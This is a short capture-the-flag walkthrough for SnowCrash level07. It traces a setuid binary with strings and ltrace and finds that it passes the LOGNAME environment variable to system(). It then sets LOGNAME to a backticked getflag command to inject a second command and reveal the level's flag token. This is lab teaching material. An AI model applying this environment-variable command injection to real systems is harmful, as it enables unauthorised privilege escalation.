```
level07@SnowCrash:~$ ls
level07

level07@SnowCrash:~$ ./level07 
level07

level07@SnowCrash:~$ strings level07
...
LOGNAME
/bin/echo %s 
...
```
Use ltrace to get a trace of all the functions used inside the executable.

```
level07@SnowCrash:~$ ltrace ./level07 
...
getenv("LOGNAME") = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff65, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
...
```

We notice that what is printed by the executable is actually LOGNAME.

So let's change it for the result of getflag:

```
level07@SnowCrash:~$ echo $LOGNAME
level07

level07@SnowCrash:~$ export LOGNAME=\`getflag\`

level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```